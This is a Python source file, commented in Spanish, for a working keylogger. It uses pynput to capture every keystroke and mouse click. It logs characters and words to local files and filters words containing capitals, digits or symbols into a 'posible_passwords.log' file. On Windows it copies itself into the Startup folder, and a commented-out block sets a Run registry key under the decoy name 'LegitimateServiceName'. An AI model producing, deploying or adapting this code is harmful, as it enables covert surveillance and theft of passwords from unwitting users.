import threading
import time
import os
import sys
import logging
import platform
from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
from auto_start import add_to_startup_folder
#
# import winreg
#
#
# def add_registry_persistence(executable_path):
#     # Open the Run key for current user
#     reg_key = winreg.CreateKey(
#         winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run')
#
#     # Add our entry
#     entry_name = "LegitimateServiceName"
#     winreg.SetValueEx(reg_key, entry_name, 0, winreg.REG_SZ, executable_path)
#
#     print(f"Added registry entry: {entry_name}")
#     winreg.CloseKey(reg_key)
#

# executable_path = "C:\\Path\\To\\Executable.exe"
# add_registry_persistence(executable_path)
system = platform.system()
if system == "Windows":
    current_directory = os.getcwd()
    print(f"Current working directory: {current_directory}")
    exe_name = os.path.basename(sys.argv[0])
    result = add_to_startup_folder(f"{current_directory}\\{exe_name}")
    if result:
        print(f"Successfully added to startup: {result}")


# Lista de teclas especiales
special_caracters_list = [
    "!", "\"", "#", "$", "%", "&", "'", "(", ")", "*", "+", ",", "-", ".", "/",
    ":", ";", "<", "=", ">", "?", "@", "[", "\\", "]", "^", "_", "{", "|", "}",
    "~"
]

# [
#     Key.alt, Key.ctrl, Key.shift, Key.esc, Key.enter, Key.space,
#     Key.backspace, Key.caps_lock, Key.tab,
#     Key.f1, Key.f2, Key.f3, Key.f4, Key.f5, Key.f6, Key.f7, Key.f8, Key.f9, Key.f10, Key.f11, Key.f12,
#     Key.up, Key.down, Key.left, Key.right, Key.home, Key.end, Key.page_up, Key.page_down
# ]

logging_format = logging.Formatter('%(asctime)s:%(message)s')

logger_characters = logging.getLogger("Characteres")
logger_words = logging.getLogger("Words")
logger_posible_paswords = logging.getLogger("Passwords")

logger_characters.setLevel(logging.DEBUG)
logger_words.setLevel(logging.DEBUG)
logger_posible_paswords.setLevel(logging.DEBUG)

# Handler para caracteres
handler_characters = logging.FileHandler("characters.log")
handler_characters.setFormatter(logging_format)
logger_characters.addHandler(handler_characters)

# Handler para palabras
handler_words = logging.FileHandler("words.log")
handler_words.setFormatter(logging_format)
logger_words.addHandler(handler_words)

# Handler para posibles passwords
handler_posible_passwords = logging.FileHandler("posible_passwords.log")
handler_posible_passwords.setFormatter(logging_format)
logger_posible_paswords.addHandler(handler_posible_passwords)

current_word = ""
# current_click_location = [0, 0]
# last_click_location = [0, 0]
has_special_character = False


def on_press(key):
    global current_word
    global has_special_character

    try:
        current_word += key.char
        logger_characters.info(key.char)
        if key.char in special_caracters_list:
            has_special_character = True
            print(f"Tecla especial: {key}")

    except AttributeError:
        if key in [Key.space, Key.enter, Key.tab]:
            if current_word.strip():
                print(f"Palabra: {current_word}")
                logger_words.info(current_word)
                has_uppercase = any(c.isupper() for c in current_word)
                has_number = any(c.isdigit() for c in current_word)
                if has_special_character or has_uppercase or has_number:
                    logger_posible_paswords.info(current_word)

            current_word = ""
            has_special_character = False


def on_click(x, y, button, pressed):
    if pressed:
        time.sleep(0.1)
        global current_word
        global has_special_character
        if button.name == "left" and current_word.strip():
            logger_words.info(current_word)
            has_uppercase = any(c.isupper() for c in current_word)
            has_number = any(c.isdigit() for c in current_word)
            if has_special_character or has_uppercase or has_number:
                logger_posible_paswords.info(current_word)
            current_word = ""
            has_special_character = False


def start_keyboard():
    with Listener(on_press=on_press) as listener:
        listener.join()


def start_mouse():
    with MouseListener(on_click=on_click) as listener:
        listener.join()


if __name__ == "__main__":
    t1 = threading.Thread(target=start_keyboard)
    t2 = threading.Thread(target=start_mouse)
    t1.start()
    t2.start()
    t1.join()
    t2.join()
